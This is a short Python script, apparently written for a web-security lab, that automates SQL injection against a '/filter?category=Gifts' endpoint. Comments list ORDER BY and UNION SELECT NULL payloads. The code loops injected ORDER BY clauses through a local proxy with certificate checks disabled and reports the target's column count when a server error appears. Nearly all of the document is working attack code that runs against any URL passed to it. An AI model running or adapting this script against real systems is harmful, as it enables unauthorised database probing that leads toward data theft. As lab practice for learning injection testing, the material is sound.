# Ways to find number of columns

# ' ORDER BY 1--
# ' ORDER BY 2--
# ' ORDER BY 3--
# etc.

# ----------------------------

# ' UNION SELECT NULL--
# ' UNION SELECT NULL,NULL--
# ' UNION SELECT NULL,NULL,NULL--
# etc.

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def exploit_sqli(url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        payload="'+ORDER+BY+{}+--".format(i)
        res = requests.get(url+path+payload,proxies=proxy,verify=False)
        if "Internal Server Error" in res.text:
            return i-1
        

if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[+] Usage : python3 {} <url>".format(sys.argv[0]))
        print("[+] Example : python3 {} www.example.com".format(sys.argv[0]))        
        sys.exit(-1)

    total_clmn=exploit_sqli(url)
    if total_clmn:
        print("Sql injection is successfull")
        print("Total number of Column is = ", total_clmn)
    else:
        print("Sql injection is unsuccessfull")    